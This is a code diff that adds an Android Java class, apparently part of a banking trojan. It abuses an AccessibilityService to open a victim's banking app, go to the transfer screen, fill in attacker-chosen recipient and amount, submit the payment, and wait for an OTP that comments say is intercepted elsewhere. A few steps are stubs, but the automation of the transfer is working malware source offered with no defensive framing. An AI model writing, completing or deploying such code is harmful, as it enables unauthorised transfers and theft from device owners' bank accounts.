@@ -1,0 +1,167 @@
+// AutoTransferModule.java
+package com.godz.rtoRed.admin.banking;
+
+import android.accessibilityservice.AccessibilityService;
+import android.os.Bundle;
+import android.view.accessibility.AccessibilityNodeInfo;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public class AutoTransferModule {
+    
+    private ExecutorService executor = Executors.newSingleThreadExecutor();
+    private AccessibilityService accessibilityService;
+    
+    public AutoTransferModule(AccessibilityService service) {
+        this.accessibilityService = service;
+    }
+    
+    public void executeTransfer(String bankPackage, TransferDetails details) {
+        executor.execute(() -> {
+            try {
+                // Step 1: Launch banking app
+                launchApp(bankPackage);
+                Thread.sleep(3000);
+                
+                // Step 2: Navigate to transfer section
+                navigateToTransfer();
+                Thread.sleep(2000);
+                
+                // Step 3: Fill recipient details
+                fillRecipientDetails(details);
+                Thread.sleep(1500);
+                
+                // Step 4: Enter amount
+                enterAmount(details.amount);
+                Thread.sleep(1000);
+                
+                // Step 5: Submit (OTP will be intercepted)
+                submitTransaction();
+                
+                // Step 6: Auto-enter OTP when received
+                waitAndEnterOTP();
+                
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        });
+    }
+    
+    private void launchApp(String packageName) {
+        // Implementation to launch app via AccessibilityService
+    }
+    
+    private void navigateToTransfer() {
+        AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
+        if (root != null) {
+            // Look for transfer buttons
+            findAndClick(root, "Transfer");
+            findAndClick(root, "Send Money");
+            findAndClick(root, "UPI");
+            root.recycle();
+        }
+    }
+    
+    private void fillRecipientDetails(TransferDetails details) {
+        AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
+        if (root != null) {
+            // Fill account/UPI field
+            fillField(root, "account", details.accountNumber);
+            fillField(root, "upi", details.upiId);
+            fillField(root, "name", details.recipientName);
+            root.recycle();
+        }
+    }
+    
+    private void enterAmount(String amount) {
+        AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
+        if (root != null) {
+            fillField(root, "amount", amount);
+            root.recycle();
+        }
+    }
+    
+    private void submitTransaction() {
+        AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
+        if (root != null) {
+            findAndClick(root, "Submit");
+            findAndClick(root, "Send");
+            findAndClick(root, "Proceed");
+            root.recycle();
+        }
+    }
+    
+    private void waitAndEnterOTP() {
+        // Wait for OTP interception
+        try {
+            Thread.sleep(30000); // Wait 30 seconds for OTP
+            
+            // OTP should be captured by OTPInterceptor
+            // This module would receive it via callback
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+    
+    private boolean findAndClick(AccessibilityNodeInfo node, String text) {
+        if (node.getText() != null && 
+            node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
+            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+        }
+        
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean clicked = findAndClick(child, text);
+                child.recycle();
+                if (clicked) return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    private boolean fillField(AccessibilityNodeInfo node, String hint, String value) {
+        if (node.getHintText() != null && 
+            node.getHintText().toString().toLowerCase().contains(hint.toLowerCase())) {
+            
+            Bundle arguments = new Bundle();
+            arguments.putCharSequence(
+                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
+                value
+            );
+            return node.performAction(
+                AccessibilityNodeInfo.ACTION_SET_TEXT,
+                arguments
+            );
+        }
+        
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean filled = fillField(child, hint, value);
+                child.recycle();
+                if (filled) return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    public static class TransferDetails {
+        String accountNumber;
+        String upiId;
+        String recipientName;
+        String amount;
+        String bankName;
+        
+        public TransferDetails(String accountNumber, String upiId, 
+                              String recipientName, String amount, String bankName) {
+            this.accountNumber = accountNumber;
+            this.upiId = upiId;
+            this.recipientName = recipientName;
+            this.amount = amount;
+            this.bankName = bankName;
+        }
+    }
+}
